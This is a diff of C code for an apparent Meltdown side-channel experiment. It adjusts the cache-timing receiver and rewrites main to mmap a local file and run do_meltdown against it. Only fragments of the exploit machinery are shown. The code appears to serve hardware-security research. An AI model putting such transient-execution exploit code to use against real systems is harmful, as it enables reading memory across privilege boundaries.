@@ -99,7 +99,7 @@ static int cc_receive() {
         maccess(cur_adrs);
         time = my_rdtsc() - time;
         flush(cur_adrs);
-        printf("%lu;", time); // this stabilizes the measurement lol (uncommented, we get less 254 fails)
+        //printf("%lu;", time); // this stabilizes the measurement lol (uncommented, we get less 254 fails)
         if (time<threshold) {
             //printf("\n");
             return i;
@@ -152,18 +152,62 @@ static int do_meltdown(uintptr_t adrs) {
 }
 
 #ifdef MELTDOWNCASE
-int main(int ac, char**av){
-    wait(1E9);
-    printf("TODO\n");
-    cc_init();
-    //uint8_t test_num = 8;
-    //meltdown((uintptr_t) &test_num);
-    //printf("%i\n", cc_receive());
-    uintptr_t target = ac==1? (uintptr_t) &cc_buffer[8*283000] : (uintptr_t) av[1];
-    printf("%i\n", do_meltdown( target));
-    printf("%i\n", do_meltdown( target));
-    printf("%i\n", do_meltdown( target));
-    munmap(cc_buffer, cc_buf_size);
+int main() {
+    const char *filename = "./file";
+
+    // Open the file
+    int fd = open(filename, O_RDONLY);
+    if (fd == -1) {
+        perror("Error opening file");
+        exit(EXIT_FAILURE);
+    }
+
+    // Get the size of the file
+    struct stat stat_buf;
+    if (fstat(fd, &stat_buf) == -1) {
+        perror("Error getting file size");
+        close(fd);
+        exit(EXIT_FAILURE);
+    }
+
+    // Map the file into memory
+    void *file_ptr = mmap(NULL, stat_buf.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
+    if (file_ptr == MAP_FAILED) {
+        perror("Error mapping file to memory");
+        close(fd);
+        exit(EXIT_FAILURE);
+    }
+ // Print the pointer and content
+    printf("Pointer: %p\n", file_ptr);
+    printf("File Content:\n%s\n", (char *)file_ptr);
+    
+    printf("%i\n", do_meltdown((uintptr_t) file_ptr));
+    
+    // Close the file descriptor since it's no longer needed
+    close(fd);
+
+   
+    printf("cnt %i\n", cnt);
+    // Unmap the file from memory
+    if (munmap(file_ptr, stat_buf.st_size) == -1) {
+        perror("Error unmapping file from memory");
+        exit(EXIT_FAILURE);
+    }
+
     return 0;
 }
+// int main(int ac, char**av){
+    // wait(1E9);
+    // printf("TODO\n");
+    // cc_init();
+    // //uint8_t test_num = 8;
+    // //meltdown((uintptr_t) &test_num);
+    // //printf("%i\n", cc_receive());
+    // uintptr_t target = ac==1? (uintptr_t) &cc_buffer[8*283000] : (uintptr_t) av[1];
+    // printf("%i\n", do_meltdown( target));
+    // printf("%i\n", do_meltdown( target));
+    // printf("%i\n", do_meltdown( target));
+    // munmap(cc_buffer, cc_buf_size);
+    // return 0;
+// }
 #endif
